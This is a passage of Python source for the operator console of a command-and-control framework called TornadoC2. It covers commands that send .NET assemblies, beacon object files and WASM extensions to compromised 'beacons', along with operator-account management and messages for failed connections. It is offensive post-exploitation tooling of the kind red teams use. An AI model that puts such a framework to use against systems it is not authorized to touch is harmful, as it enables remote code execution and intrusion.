        b64 = _b64.b64encode(blob).decode('ascii')
        rest = parts[2:]
        if rest and rest[0] == '--':
            rest = rest[1:]

        started = time.time()
        out, err, code = self._send_and_wait(
            'execute_assembly',
            [b64] + rest,
            timeout=300)
        elapsed = time.time() - started

        if err is not None:
            print(f"{CLR['red']}✗ execute-assembly{CLR['reset']}  "
                  f"{CLR['dim']}({elapsed:.2f}s){CLR['reset']}")
            for line in str(err).splitlines():
                print(f"  {CLR['red']}{line}{CLR['reset']}")
            return

        text = (out or b'').decode(
            'utf-8', errors='replace').rstrip()
        exit_note = f"  exit {code}" if code else ""
        print(f"{CLR['green']}✓{CLR['reset']} "
              f"{CLR['cyan']}execute-assembly{CLR['reset']}"
              f"{CLR['dim']}  {elapsed:.2f}s{exit_note}"
              f"{CLR['reset']}")
        if text:
            _print_wrapped(text)

    # ------------------------------------------------------------------
    # BOF (local .o files only)

    def _cmd_bof(self, parts):
        """bof <path.o|name> [args...]

        If the first argument is a local file, read it and
        dispatch it (same as before). If it is not a local file,
        treat it as a name in the server-side registry, fetch the
        bytes from /api/v1/bofs/get, and dispatch those.

        Windows-only. A BOF is a COFF object; only the Windows
        agent has the C# loader that can run one. The server also
        enforces this at task-enqueue time — this check just saves
        the round-trip and prints a clearer message.
        """
        if len(parts) < 2:
            print(f"{CLR['red']}usage: bof <path.o|name> [args...]"
                  f"{CLR['reset']}")
            return

        current_os = None
        for b in getattr(self, '_beacon_cache', []):
            if b.get('id') == self.current_beacon:
                current_os = b.get('os')
                break
        if current_os and current_os != 'windows':
            print(f"{CLR['red']}bof requires a Windows beacon "
                  f"(#{self.current_beacon} is {current_os})"
                  f"{CLR['reset']}")
            return

        target_arg = parts[1]
        extra_args = parts[2:]

        # --- Case 1: local file ---
        if os.path.isfile(target_arg):
            try:
                with open(target_arg, 'rb') as fh:
                    coff = fh.read()
            except OSError as exc:
                print(f"{CLR['red']}read error: {exc}{CLR['reset']}")
                return
            fmt = ''
            source_label = target_arg
        # --- Case 2: registry lookup ---
        else:
            try:
                r = self.tp.post('/api/v1/bofs/get',
                                 {'name': target_arg})
            except Exception as exc:
                print(f"{CLR['red']}registry fetch failed: {exc}"
                      f"{CLR['reset']}")
                return
            if not r.get('ok'):
                print(f"{CLR['red']}BOF {target_arg!r}: "
                      f"{r.get('error', 'not found')}{CLR['reset']}")
                print(f"{CLR['dim']}list registered BOFs with "
                      f"`bofs list`{CLR['reset']}")
                return
            try:
                coff = _b64.b64decode(r.get('data_b64') or '')
            except Exception:
                print(f"{CLR['red']}bad response encoding"
                      f"{CLR['reset']}")
                return
            fmt = r.get('format') or ''
            source_label = f"registry:{target_arg}"

        if len(coff) < 20:
            print(f"{CLR['red']}not a COFF (file too small)"
                  f"{CLR['reset']}")
            return
        machine = struct.unpack_from('<H', coff, 0)[0]
        if machine not in (0x8664, 0x014c):
            print(f"{CLR['red']}unsupported COFF machine: "
                  f"0x{machine:04X}{CLR['reset']}")
            return

        packed = b''
        if extra_args:
            if fmt:
                try:
                    packed = _pack_args_from_format(extra_args, fmt)
                except Exception as exc:
                    print(f"{CLR['red']}argument packing failed "
                          f"(format={fmt!r}): {exc}{CLR['reset']}")
                    return
            else:
                body = ' '.join(extra_args).encode('utf-8') + b'\x00'
                packed = struct.pack('<I', len(body)) + body

        if source_label.startswith('registry:'):
            print(f"{CLR['dim']}loaded {source_label} "
                  f"({len(coff)} bytes, fmt={fmt or '-'})"
                  f"{CLR['reset']}")

        coff_b64 = _b64.b64encode(coff).decode('ascii')
        args_b64 = _b64.b64encode(packed).decode('ascii')
        self._dispatch_task(['bof', coff_b64, '', args_b64])

    # ------------------------------------------------------------------
    # Extension loading (local .wasm files)

    def _cmd_extension_load(self, parts):
        """extension load <path.wasm> [--name <name>]

        The name defaults to the .wasm file stem. Use --name to
        override. Loading from the server-side extension store is
        not available; pass a local path.
        """
        if len(parts) < 3:
            print(f"{CLR['red']}usage: extension load <path.wasm> "
                  f"[--name <name>]{CLR['reset']}")
            return
        path = parts[2]
        if not os.path.isfile(path):
            print(f"{CLR['red']}wasm not found: {path}{CLR['reset']}")
            return

        name = os.path.splitext(os.path.basename(path))[0]
        if len(parts) >= 5 and parts[3] == '--name':
            name = parts[4]

        try:
            with open(path, 'rb') as fh:
                blob = fh.read()
        except OSError as exc:
            print(f"{CLR['red']}read error: {exc}{CLR['reset']}")
            return

        b64 = _b64.b64encode(blob).decode('ascii')
        print(f"{CLR['dim']}loading {name} ({len(blob)} bytes, "
              f"{len(b64)} on the wire){CLR['reset']}")
        self._dispatch_task(['extension_register', name, b64])

    # ------------------------------------------------------------------
    # Remote operator management

    def _cmd_operators(self, parts):
        """operators list
           operators add <name> <viewer|operator>
           operators remove <name>
           operators set-role <name> <viewer|operator>

        Admins can manage viewer and operator accounts. Admin
        accounts themselves are protected: they can only be
        created, removed, or demoted from the local console on the
        team server machine.
        """
        sub = parts[1].lower() if len(parts) > 1 else 'list'

        if sub in ('list', 'ls'):
            try:
                r = self.tp.post('/api/v1/operators', {})
            except Exception as exc:
                print(f"{CLR['red']}operators fetch failed: {exc}"
                      f"{CLR['reset']}")
                return
            entries = r.get('operators') or []
            if not entries:
                print(f"  {CLR['dim']}no operators registered"
                      f"{CLR['reset']}")
                return
            c = CLR
            _header(f'OPERATORS  ·  {len(entries)}')
            print(f"  {c['bold']}"
                  f"{'NAME':<24} {'ROLE':<10} {'STATE':<10} ADDED"
                  f"{c['reset']}")
            _hr(72, '─')
            for e in sorted(entries, key=lambda x: x.get('name', '')):
                state = ('revoked' if e.get('revoked')
                         else 'active')
                state_col = (c['red'] if state == 'revoked'
                             else c['green'])
                added = e.get('added')
                if added:
                    added_str = time.strftime(
                        '%Y-%m-%d %H:%M',
                        time.localtime(added))
                else:
                    added_str = '—'
                print(f"  {e.get('name', '?'):<24} "
                      f"{e.get('role', '?'):<10} "
                      f"{state_col}{state:<10}{c['reset']} "
                      f"{c['dim']}{added_str}{c['reset']}")
            print()
            return

        if sub == 'add':
            if len(parts) < 3:
                print(f"{CLR['red']}usage: operators add <name> "
                      f"<viewer|operator>{CLR['reset']}")
                return
            new_name = parts[2]
            new_role = parts[3].lower() if len(parts) > 3 else 'operator'

            import getpass
            print(f"  {CLR['dim']}Password is optional. Leave blank "
                  f"for cert-only authentication.{CLR['reset']}")
            try:
                pw1 = getpass.getpass(
                    f"  {CLR['green']}Password "
                    f"(blank = none){CLR['reset']}: ")
                if pw1:
                    pw2 = getpass.getpass(
                        f"  {CLR['green']}Confirm{CLR['reset']}: ")
                    if pw1 != pw2:
                        print(f"{CLR['red']}passwords do not match"
                              f"{CLR['reset']}")
                        return
            except (EOFError, KeyboardInterrupt):
                print()
                print(f"{CLR['cyan']}cancelled{CLR['reset']}")
                return

            payload = {'name': new_name, 'role': new_role}
            if pw1:
                payload['password'] = pw1

            try:
                r = self.tp.post('/api/v1/operators/add', payload)
            except Exception as exc:
                print(f"{CLR['red']}add failed: {exc}{CLR['reset']}")
                return
            if r.get('ok'):
                print(f"{CLR['green']}✓ added {new_name} as "
                      f"{new_role}"
                      f"{' (password required)' if pw1 else ''}"
                      f"{CLR['reset']}")
                if pw1:
                    print(f"  {CLR['yellow']}Hand the password to "
                          f"{new_name} out of band — not in the "
                          f"config file, not over the C2 channel."
                          f"{CLR['reset']}")
                print(f"  {CLR['dim']}Use `operators export "
                      f"{new_name}` to mint their config file — "
                      f"the exported config will carry "
                      f"password_required: true.{CLR['reset']}")
            else:
                print(f"{CLR['red']}{r.get('error', 'failed')}"
                      f"{CLR['reset']}")
            return

        if sub in ('remove', 'rm'):
            if len(parts) < 3:
                print(f"{CLR['red']}usage: operators remove <name>"
                      f"{CLR['reset']}")
                return
            target = parts[2]
            try:
                r = self.tp.post('/api/v1/operators/remove', {
                    'name': target})
            except Exception as exc:
                print(f"{CLR['red']}remove failed: {exc}"
                      f"{CLR['reset']}")
                return
            if r.get('ok'):
                print(f"{CLR['green']}✓ removed {target}"
                      f"{CLR['reset']}")
            else:
                print(f"{CLR['red']}{r.get('error', 'failed')}"
                      f"{CLR['reset']}")
            return

        if sub in ('set-role', 'role'):
            if len(parts) < 4:
                print(f"{CLR['red']}usage: operators set-role "
                      f"<name> <viewer|operator>{CLR['reset']}")
                return
            target = parts[2]
            new_role = parts[3].lower()
            try:
                r = self.tp.post('/api/v1/operators/set-role', {
                    'name': target,
                    'role': new_role,
                })
            except Exception as exc:
                print(f"{CLR['red']}set-role failed: {exc}"
                      f"{CLR['reset']}")
                return
            if r.get('ok'):
                print(f"{CLR['green']}✓ {target} → {new_role}"
                      f"{CLR['reset']}")
            else:
                print(f"{CLR['red']}{r.get('error', 'failed')}"
                      f"{CLR['reset']}")
            return

        if sub == 'export':
            self._cmd_operators_export(parts)
            return

        if sub in ('passwd', 'password'):
            self._cmd_operators_passwd(parts)
            return

        print(f"{CLR['red']}usage: operators "
              f"<list|add|remove|set-role|passwd|export>"
              f"{CLR['reset']}")


# ---------------------------------------------------------------------
# Friendly connection failures

def _print_connect_error(cfg, exc):
    c = CLR
    msg = str(exc)
    host = cfg.get('server_host', '?')
    port = cfg.get('server_port', '?')

    status = None
    if msg.startswith('HTTP '):
        try:
            status = int(msg[5:].split(':', 1)[0])
        except (ValueError, IndexError):
            pass

    print()
    print(f"{c['red']}{c['bold']}connection failed{c['reset']}  "
          f"{c['dim']}{host}:{port}{c['reset']}")
    print()

    if status == 503:
        print(f"  {c['yellow']}The team server is running but "
              f"refused the request.{c['reset']}")
        print()
        print(f"  Most common cause: multiplayer is off. On the "
              f"server console, run:")
        print()
        print(f"      {c['cyan']}multiplayer on{c['reset']}")
        print()
        print(f"  The handler starts with multiplayer disabled by "
              f"design. Once enabled, re-run this client.")
    elif status in (401, 403):
        lower_msg = msg.lower()
        if '[password_invalid]' in lower_msg:
            print(f"  {c['yellow']}The password is incorrect."
                  f"{c['reset']}")
            print()
            print(f"  The server received the HMAC headers but the "
                  f"key derived from the password you entered did "
                  f"not match the one on record. Retry the client "
                  f"and enter the password again. If it is lost, "
                  f"ask an admin to reset it:")
            print()
            print(f"      {c['cyan']}operators passwd "
                  f"{cfg.get('name', '<you>')}{c['reset']}")
            print()
            print(f"  If the password is known to be correct, "
                  f"check the clocks on the client and the server — "
                  f"the HMAC is timestamped and the server refuses "
                  f"requests whose timestamp is more than 5 minutes "
                  f"off.")
        elif '[password_required]' in lower_msg:
            print(f"  {c['yellow']}This operator requires a "
                  f"password, but the client did not send one."
                  f"{c['reset']}")
            print()
            print(f"  The config file was exported before the "
                  f"server started marking password-protected "
                  f"configs. Re-export on the server:")
            print()
            print(f"      {c['cyan']}operators export "
                  f"{cfg.get('name', '<you>')}{c['reset']}")
            print()
            print(f"  The next client run will prompt for the "
                  f"password before connecting.")
        elif '[session_expired]' in lower_msg:
            print(f"  {c['yellow']}Your session expired."
                  f"{c['reset']}")
            print()
            print(f"  The client has been connected for longer "
                  f"than the server's maximum session age. "
                  f"Reconnect to start a fresh session. The "
                  f"client will re-prompt for your password on "
                  f"the next request if the operator has one.")
        elif '[revoked]' in lower_msg:
            print(f"  {c['yellow']}This operator has been revoked."
                  f"{c['reset']}")
            print()
            print(f"  Ask an admin to restore the account:")
            print()
            print(f"      {c['cyan']}operators add "
                  f"{cfg.get('name', '<you>')} operator{c['reset']}")
        elif '[unknown_operator]' in lower_msg:
            print(f"  {c['yellow']}This operator is not in the "
                  f"team server's registry.{c['reset']}")
            print()
            print(f"  The certificate is valid but the account was "
                  f"removed. Ask an admin to re-add it:")
            print()
            print(f"      {c['cyan']}operators add "
                  f"{cfg.get('name', '<you>')} operator{c['reset']}")
        elif '[cert]' in lower_msg:
            print(f"  {c['yellow']}The server rejected this "
                  f"operator's certificate.{c['reset']}")
            print()
            print(f"  This config was either not minted by this "
                  f"team server, or the operator has been removed. "
                  f"Ask an admin to run:")
            print()
            print(f"      {c['cyan']}operators export "
                  f"{cfg.get('name', '<you>')}{c['reset']}")
            print()
            print(f"  on the server console and hand you the new "
                  f"file.")
        else:
            print(f"  {c['yellow']}{msg}{c['reset']}")
            if 'password' in lower_msg:
                print()
                print(f"  {c['dim']}The password may be missing "
                      f"from the request or incorrect. Re-export "
                      f"the config and retry.{c['reset']}")
    elif status == 404:
        print(f"  {c['yellow']}The server did not recognise the "
              f"endpoint.{c['reset']}")
        print()
        print(f"  Client and server versions may not match. "
              f"Confirm both come from the same TornadoC2 checkout.")
    elif status is not None:
        print(f"  {c['yellow']}Server returned HTTP {status}."
              f"{c['reset']}")
        print(f"  {c['dim']}{msg}{c['reset']}")
    else:
        lower = msg.lower()
        if ('certificate' in lower or 'tls' in lower
                or 'ssl' in lower
                or 'certificate_verify_failed' in lower):
            print(f"  {c['yellow']}TLS handshake failed.{c['reset']}")
            print()
            print(f"  {c['dim']}{msg}{c['reset']}")
            print()
            print(f"  The config's CA, client cert, and client key "
                  f"must all come from the same team_ca/ the server "
                  f"is using. On the server, run:")
            print()
            print(f"      {c['cyan']}operator add "
                  f"{cfg.get('name', '<you>')} operator{c['reset']}")
            print(f"      {c['cyan']}operator export "
                  f"{cfg.get('name', '<you>')}{c['reset']}")
            print()
            print(f"  then overwrite this config file with the "
                  f"exported one and re-run the client.")
        elif 'refused' in lower or 'connect' in lower:
            print(f"  {c['yellow']}The team server is not reachable "
                  f"at {host}:{port}.{c['reset']}")
            print()
            print(f"  Check that:")
            print(f"      - the handler is running")
            print(f"      - it was started with "
                  f"{c['cyan']}--operator-port {port}{c['reset']}")
            print(f"      - no firewall is blocking the port")
        elif 'timed out' in lower or 'timeout' in lower:
            print(f"  {c['yellow']}Connection timed out.{c['reset']}")
            print()
            print(f"  The address is routable but nothing answered. "
                  f"Check firewall rules and the server_host value "
                  f"in the config.")
        else:
            print(f"  {c['red']}{msg}{c['reset']}")

    print()

def main():
    ap = argparse.ArgumentParser(
        description='TornadoC2 operator client')
    ap.add_argument('-c', '--config', required=True,
                    help='Path to operator config file')
    ap.add_argument('--debug', action='store_true',
                    help='print full tracebacks on failure')
    args = ap.parse_args()

    try:
        cfg = cfg_mod.load(args.config)
    except (OSError, ValueError) as exc:
        print(f"config error: {exc}", file=sys.stderr)
        return 1

    age = cfg_mod.age_days(args.config)
    if age > 90:
        print(f"warning: config is {age:.0f} days old",
              file=sys.stderr)

    try:
        tp = Transport(cfg)
    except Exception as exc:
        if args.debug:
            raise
        print(f"could not set up the TLS transport: {exc}",
              file=sys.stderr)
        print("the config's ca_pem / client_cert / client_key are "
              "probably malformed — regenerate the config on the "
              "server with `operator export`.", file=sys.stderr)
        return 1

    client = Client(cfg, tp, config_path=args.config)
    try:
        try:
            client.banner()
        except RuntimeError as exc:
            if args.debug:
                raise
            _print_connect_error(cfg, exc)
            return 1
        except KeyboardInterrupt:
            print()
            return 130
        try:
            client.run()
        except KeyboardInterrupt:
            print()
            return 0
    finally:
        tp.close()
    return 0


if __name__ == '__main__':
    sys.exit(main())